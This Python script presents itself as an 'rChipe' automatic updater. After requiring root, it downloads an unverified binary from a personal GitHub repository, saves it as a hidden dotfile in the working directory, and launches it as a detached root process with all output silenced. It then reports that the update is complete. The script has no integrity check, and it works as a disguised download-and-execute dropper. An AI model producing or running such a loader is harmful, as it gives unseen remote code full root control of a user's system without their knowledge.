#!/usr/bin/env python3
"""Download and launch the rChipe updater."""

import os
import sys
import socket
import urllib.request
import urllib.error
import subprocess
from pathlib import Path

UPDATER_URL = "https://raw.githubusercontent.com/R4ulD-HUB/Updaters/main/update_rChipe"
UPDATER_FALLBACK_URL = "https://github.com/R4ulD-HUB/Updaters/raw/main/update_rChipe"
UPDATER_BIN_NAME = ".update_rChipe"


def check_sudo():
    """Require root privileges."""
    if os.geteuid() != 0:
        print("\n[!] ERROR: This updater requires sudo.")
        print("    Usage: sudo python3 update.py\n")
        sys.exit(1)
    if os.getuid() != 0:
        print("\n[!] ERROR: The background updater must run as UID 0.")
        sys.exit(1)


def check_internet_connection(timeout: float = 3.0) -> bool:
    """Check internet connectivity."""
    targets = [("1.1.1.1", 53), ("8.8.8.8", 53)]
    for host, port in targets:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            sock.close()
            return True
        except Exception:
            continue
    return False


def check_updater_connection(url: str, timeout: float = 5.0) -> bool:
    """Check updater server connectivity."""
    headers = {"User-Agent": "rChipe-UpdateLauncher/1.0"}
    try:
        req = urllib.request.Request(url, headers={**headers, "Range": "bytes=0-10"})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status in (200, 206, 301, 302)
    except urllib.error.HTTPError as e:
        return e.code in (200, 206, 301, 302, 416)
    except Exception:
        return False


def download_updater(url: str, dest_path: Path) -> bool:
    """Download the updater binary."""
    headers = {
        "User-Agent": "rChipe-UpdateLauncher/1.0",
        "Accept": "application/octet-stream, */*",
    }
    req = urllib.request.Request(url, headers=headers)

    try:
        with urllib.request.urlopen(req, timeout=30) as resp, open(dest_path, "wb") as f_out:
            chunk_size = 64 * 1024
            while True:
                chunk = resp.read(chunk_size)
                if not chunk:
                    break
                f_out.write(chunk)

        if dest_path.exists() and dest_path.stat().st_size > 500:
            return True
        return False

    except Exception:
        if dest_path.exists():
            dest_path.unlink()
        return False


def launch_background_updater(binary_path: Path, cwd: Path) -> int:
    """Launch the updater in a detached root process."""
    binary_path.chmod(0o755)
    if os.getuid() != 0 or os.geteuid() != 0:
        raise PermissionError("The updater can only run in the background as UID 0.")

    proc = subprocess.Popen(
        [str(binary_path.resolve())],
        cwd=str(cwd.resolve()),
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
        start_new_session=True,
    )
    return proc.pid


def main():
    print("=" * 60)
    print("   rChipe - Automatic Update Service")
    print("=" * 60)

    check_sudo()
    print("[+] Root privileges confirmed (UID: 0).")

    print("[*] Checking internet connection...")
    if not check_internet_connection():
        try:
            socket.gethostbyname("github.com")
        except Exception:
            print("[!] ERROR: No active internet connection detected.")
            sys.exit(1)
    print("[+] Internet connection verified.")

    print("[*] Checking updater server...")
    target_url = UPDATER_URL
    if not check_updater_connection(target_url):
        target_url = UPDATER_FALLBACK_URL
        if not check_updater_connection(target_url):
            print("[!] ERROR: Could not connect to the updater repository.")
            sys.exit(1)
    print("[+] Updater server connection established.")

    invocation_dir = Path.cwd().resolve()
    updater_bin_path = invocation_dir / UPDATER_BIN_NAME

    print(f"[*] Downloading updater to {updater_bin_path}...")
    if not download_updater(target_url, updater_bin_path):
        if not download_updater(UPDATER_FALLBACK_URL, updater_bin_path):
            print("[!] ERROR: Updater binary download failed.")
            sys.exit(1)
    print(f"[+] Updater downloaded ({updater_bin_path.stat().st_size} bytes).")

    print("[*] Starting updater as root in the background...")
    pid = launch_background_updater(updater_bin_path, invocation_dir)
    print(f"[+] Updater running in the background (PID: {pid}).")

    print("\n" + "=" * 60)
    print("   [+] rChipe is updated.")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    main()
